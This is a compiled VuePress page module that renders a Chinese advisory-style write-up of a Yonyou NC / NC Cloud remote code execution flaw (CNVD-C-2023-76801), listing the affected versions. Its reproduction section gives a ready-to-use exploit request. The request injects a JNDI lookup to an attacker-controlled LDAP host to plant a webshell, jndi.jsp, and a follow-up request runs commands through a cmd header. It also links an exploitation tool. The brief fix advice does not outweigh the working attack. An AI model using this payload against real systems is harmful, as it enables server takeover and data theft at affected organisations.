import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as d,c as l,a as e,b as i,d as o,e as n}from"./app-58e4a7d6.js";const r={},c=n(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>用友 NC 及 NC Cloud 系统存在任意文件上传漏洞，攻击者可通过 uapjs（jsinvoke）应用构造恶意请求非法上传后门程序，此漏洞可以给 NC 服务器预埋后门，从而可以随意操作服务器。</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>NC63、NC633、NC65
NC Cloud1903、NC Cloud1909
NC Cloud2005、NC Cloud2105、NC Cloud2111
YonBIP 高级版 2207
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2>`,5),u={href:"https://github.com/WhiteHSBG/JNDIExploit",target:"_blank",rel:"noopener noreferrer"},v=n(`<p>exp：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /uapjs/jsinvoke/?action=invoke HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
 
{&quot;serviceName&quot;:&quot;nc.itf.iufo.IBaseSPService&quot;,&quot;methodName&quot;:&quot;saveXStreamConfig&quot;,&quot;parameterTypes&quot;:[&quot;java.lang.Object&quot;,&quot;java.lang.String&quot;],&quot;parameters&quot;:[&quot;\${&#39;&#39;.getClass().forName(&#39;javax.naming.InitialContext&#39;).newInstance().lookup(&#39;ldap://VPSip:1389/TomcatBypass/TomcatEcho&#39;)}&quot;,&quot;webapps/nc_web/jndi.jsp&quot;]}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>exp 中使用的是 JNDI 工具的 TomcatEcho 回显链 ，执行命令并回显：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>GET /jndi.jsp HTTP/1.1
Host: your-ip
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/114.0
cmd: whoami
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h2 id="漏洞修复" tabindex="-1"><a class="header-anchor" href="#漏洞修复" aria-hidden="true">#</a> 漏洞修复</h2><ol><li>官方已经发布修复补丁，请进行升级。</li><li>或者进行 waf 等安全部署拦截恶意字符</li></ol>`,6);function m(p,h){const a=s("ExternalLinkIcon");return d(),l("div",null,[c,e("p",null,[i("JNDI："),e("a",u,[i("https://github.com/WhiteHSBG/JNDIExploit"),o(a)])]),v])}const q=t(r,[["render",m],["__file","用友 NC Cloud 远程代码执行漏洞 CNVD-C-2023-76801.html.vue"]]);export{q as default};
